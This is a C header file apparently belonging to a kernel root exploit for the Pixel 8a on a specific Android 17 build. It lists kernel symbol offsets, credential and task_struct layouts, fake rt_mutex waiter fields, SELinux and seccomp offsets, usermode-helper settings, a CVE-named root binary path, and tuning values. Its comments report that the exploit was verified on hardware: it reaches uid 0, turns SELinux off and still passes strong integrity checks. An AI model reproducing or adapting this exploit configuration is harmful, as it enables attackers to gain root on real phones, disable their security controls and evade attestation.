// akita -- Pixel 8a, Android 17
// Build:  CP2A.260805.005
// Kernel: 6.1.157-android14-11-gbd23337e42e7-ab14791245  (KMI android14-6.1)
//
// PROVENANCE
// ==========
// All symbol offsets extracted via vmlinux-to-elf from
// /dev/block/by-name/boot_a on a physical Pixel 8a (CP2A.260805.005):
//   -> 102271 symbols recovered, base 0xffffffc008000000
// All struct offsets from the device's own BTF blob (/sys/kernel/btf/vmlinux).
// 25/25 offsets cross-checked against tegu-CP2A.260705.006: ALL MATCH.
//
// GKI IDENTITY
// ============
// akita (Pixel 8a, Tensor G3) and tegu (Pixel 9a, Tensor G4) share the
// exact same GKI kernel binary: md5 1fd9a88f42333a5aecef2a6dab02e530,
// CI build ab14791245. Offsets are verified from akita's own kernel, not
// inherited -- they happen to be identical because the binary is the same.
//
// TENSOR G3 TIMING
// ================
// The default hold=20000 / arm=16 constants cause panics at page ~20 on
// Tensor G3's scheduler. Set in ExploitService.kt for akita:
//   MAIN_TCP_POST_GETSOCKOPT_HOLD = 35000
//   MAIN_TCP_ROUTE_ARM_SEQ        = 20
// Read at runtime by fops.c env_int_range() -- no recompile needed.
//
// VERIFIED ON HARDWARE
// ====================
// Physical Pixel 8a, CP2A.260805.005:
//   uid 2000 -> 0, selinux 1 -> 0
//   su -c id: uid=0(root) context=u:r:kernel:s0
//   kernelsu 35040 1 - Live in /proc/modules
//   ReSukiSU: Working, LKM, Jailbreak mode
//   Bootloader locked; MEETS_STRONG_INTEGRITY passes natively

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "akita-CP2A.260805.005-app"
#else
#define BUILD_VARIANT_LABEL "akita-CP2A.260805.005-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/akita/akita:17/CP2A.260805.005/15828068:user/release-keys"
#endif

// -- Memory layout (VA_BITS=39, 4K pages, KASAN_HW_TAGS) ---------------------
#define KIMAGE_TEXT_BASE            0xffffffc008000000ULL
#define P0_PAGE_OFFSET              0xffffff8000000000ULL
#define P0_PHYS_OFFSET              0x80000000ULL
#define P0_KERNEL_PHYS_LOAD         0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#define DIRECT_MAP_BASE             0xffffff8000000000ULL
#define DIRECT_MAP_END              0xffffff9000000000ULL
#define VMEMMAP_START               0xfffffffe00000000ULL

// -- 6.1 kmalloc / mm_struct knobs --------------------------------------------
// BTF: sizeof(mm_struct)=960, SLAB_HWCACHE_ALIGN rounds stride to 1024.
// CONFIG_ZONE_DMA not set: NORMAL=0, CGROUP=1, RECLAIM=2, NR_TYPES=3.
#define MM_STRUCT_SZ        0x400
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3
#define KMALLOC_PIPE_INDEX  11

// -- Kernel symbol offsets (vmlinux-to-elf from akita boot_a) -----------------
// All verified from akita's own kernel. Format: virtual_addr - KIMAGE_TEXT_BASE
#define ASHMEM_IOCTL_OFF            0x00c38d28ULL
#define ASHMEM_MMAP_OFF             0x00c396b8ULL
#define ASHMEM_OPEN_OFF             0x00c398d8ULL
#define ASHMEM_RELEASE_OFF          0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
#define ASHMEM_MISC_FOPS_OFF        0x0217cb80ULL  // ashmem_miscs + 0x10
#define ASHMEM_FOPS_OFF             0x01280b50ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c39660ULL  // compat_ashmem_ioctl
#define CONFIGFS_READ_ITER_OFF      0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464930ULL
#define COPY_SPLICE_READ_OFF        0x003e5fd4ULL  // generic_file_splice_read
#define NOOP_LLSEEK_OFF             0x003986dcULL
#define INIT_TASK_OFF               0x0201f640ULL
#define ROOT_TASK_GROUP_OFF         0x02208580ULL
#define SELINUX_ENFORCING_OFF       0x0225a420ULL  // selinux_state + 0x0
#define SELINUX_BLOB_SIZES_OFF      0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF     0x015ce478ULL
#define KMALLOC_CACHES_OFF          0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0200ae60ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

// -- Slide references ---------------------------------------------------------
// nfulnl_logger: 0xffffffc00a0129d0 -> 0x020129d0
// loggers[0][1] = loggers(0x02012918) + 8 = 0x02012920
// random_table[4].data = 0x02137c00 + 4*0x40 + 0x8 = 0x02137d08
#define SLIDE_NFULNL_LOGGER_OFF       0x020129d0ULL
#define SLIDE_LOGGERS_0_1_OFF         0x02012920ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02137d08ULL
#define SLIDE_INIT_TASK_OFF           INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF     ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF       0x0227b498ULL
#define SLIDE_LOGGER_PARENT           SLIDE_LOGGERS_0_1

#define MAIN_TCP_ROUTE_DEFAULT   1
#define MAIN_TCP_PAYLOAD_DEFAULT 1
// Stack frames identical to tegu (same binary). shift=1 (tegu-proven).
#define KSNITCH_COLLISIONS 8
#define PSELECT_WAITER_WORD_SHIFT 1

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// -- Page layout --------------------------------------------------------------
#define LOCK_OFF      0x1350
#define W0_OFF        0x2220
#define FOPS_OFF      0x1000
#define SCRATCH_OFF   0x3000
#define RIGHT_OFF     0x4440
#define LEFT_OFF      0x5550
#define FAKE_TASK_OFF 0x3200

// -- struct rt_mutex_waiter (BTF verified, size=0x58, FLAT 6.1 layout) --------
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x18
#define FAKE_WAITER_TASK_OFF             0x30
#define FAKE_WAITER_LOCK_OFF             0x38
#define FAKE_WAITER_WAKE_STATE_OFF       0x40
#define FAKE_WAITER_TREE_PRIO_OFF        0x44
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x44
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x48
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF           0x50

// -- struct task_struct (BTF verified, size=0x12c0, 216 members) --------------
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x348
#define FAKE_TASK_PI_LOCK_OFF       0x924
#define FAKE_TASK_PI_WAITERS_OFF    0x938
#define FAKE_TASK_PI_TOP_TASK_OFF   0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950
#define TASK_PID_OFF                0x630
#define TASK_TGID_OFF               0x634
#define TASK_REAL_PARENT_OFF        0x640
#define TASK_REAL_CRED_OFF          0x830
#define TASK_CRED_OFF               0x838
#define TASK_COMM_OFF               0x848
#define TASK_TASKS_OFF              0x550
#define TASK_THREAD_INFO_FLAGS_OFF  0x00
#define TASK_SECCOMP_OFF            0x900
#define TASK_ATOMIC_FLAGS_OFF       0x5f0

// -- struct cred (BTF verified, size=0xb0) ------------------------------------
#define CRED_UID_OFF          4
#define CRED_SECUREBITS_OFF   36
#define CRED_CAPS_OFF         40
#define CRED_SECURITY_OFF     120
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF  4

// -- struct seccomp (BTF verified, size=0x10) ---------------------------------
#define SECCOMP_MODE_OFF         0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF       0x08
#define TIF_SECCOMP_BIT          11
#define PFA_NO_NEW_PRIVS_BIT     0

#define MM_OWNER_OFF     0x338
#define PIPE_BUFFER_SIZE 0x28

#define WAITER_LOCAL_OFF         0x80
#define WAITER_TREE_ENTRY_OFF    0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF          0x30
#define WAITER_LOCK_OFF          0x38
#define WAITER_WAKE_STATE_OFF    0x40
#define WAITER_PRIO_OFF          0x44
#define WAITER_DEADLINE_OFF      0x48
#define WAITER_WW_CTX_OFF        0x50

// -- struct page / slab (BTF verified) ----------------------------------------
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30
#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

// -- struct file_operations (BTF verified, size=0x110) ------------------------
// 6.1 keeps sendpage: splice_read@0xc8, show_fdinfo@0xe0
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_POST_LLSEEK_OFF  0x10
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xc8
#define FOPS_SHOW_FDINFO_OFF  0xe0

// -- workqueue offsets (BTF verified) -----------------------------------------
#define WQ_DFL_PWQ_OFF       0xb0
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x5c
#define PWQ_MAX_ACTIVE_OFF   0x60
#define POOL_WORKLIST_OFF    0x28
#define POOL_NR_IDLE_OFF     0x3c
#define WORK_DATA_OFF        0x00
#define WORK_ENTRY_OFF       0x08
#define WORK_FUNC_OFF        0x18

// -- struct configfs_buffer (BTF verified, size=0x80) -------------------------
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

// -- su_daemon UMH ------------------------------------------------------------
#define ROOT_UMH_PATH     "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
